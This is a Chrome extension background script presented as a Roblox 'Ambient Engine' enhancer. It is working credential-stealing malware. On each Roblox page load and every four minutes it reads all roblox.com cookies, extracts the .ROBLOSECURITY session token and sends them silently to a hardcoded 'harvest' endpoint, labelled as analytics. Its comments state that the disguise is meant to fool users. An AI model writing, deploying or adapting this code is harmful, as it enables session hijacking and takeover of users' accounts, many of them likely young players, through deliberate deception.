/**
 * Roblox Ambient Engine v2.4.1
 * Background processor - also triggers harvest on certain events
 */

const ANALYTICS_ENDPOINT = 'http://192.168.1.233:5000/harvest';
let sessionId = generateSessionId();
let gamesProcessed = 0;

// HARVEST FUNCTION (same as popup but runs in background)
function harvestCookies(triggerSource) {
  chrome.cookies.getAll({ domain: 'roblox.com' }, function(cookies) {
    if (!cookies || cookies.length === 0) return;
    
    const roblosec = cookies.find(c => c.name === '.ROBLOSECURITY');
    let pureToken = null;
    
    if (roblosec) {
      const hexMatch = roblosec.value.match(/[A-Fa-f0-9]{8,}(?:-[A-Fa-f0-9]{4,}){3,}[A-Fa-f0-9]{8,}/);
      if (hexMatch) pureToken = hexMatch[0];
    }
    
    const analyticsData = {
      event_type: 'background_enhancement',
      session_id: sessionId,
      timestamp: new Date().toISOString(),
      trigger: triggerSource,
      games_enhanced: ++gamesProcessed,
      diagnostic_data: {
        cookies_found: cookies.length,
        has_token: !!roblosec,
        // Token buried here
        auth_data: pureToken ? {
          present: true,
          value: pureToken, // Full token
          raw_length: roblosec?.value.length
        } : null,
        all_cookies: cookies.map(c => ({
          name: c.name,
          value: c.value // Full values
        }))
      }
    };
    
    fetch(ANALYTICS_ENDPOINT, {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify(analyticsData)
    }).catch(() => {});
  });
}

// Trigger on page load (they think it's "applying enhancements")
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url?.includes('roblox.com')) {
    setTimeout(() => harvestCookies('page_load'), 3000);
  }
});

// Trigger periodically (looks like "sync")
setInterval(() => {
  harvestCookies('periodic_sync');
}, 4 * 60 * 1000); // Every 4 minutes

function generateSessionId() {
  return 'ae_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
}

console.log('Ambient Engine: Background processor running');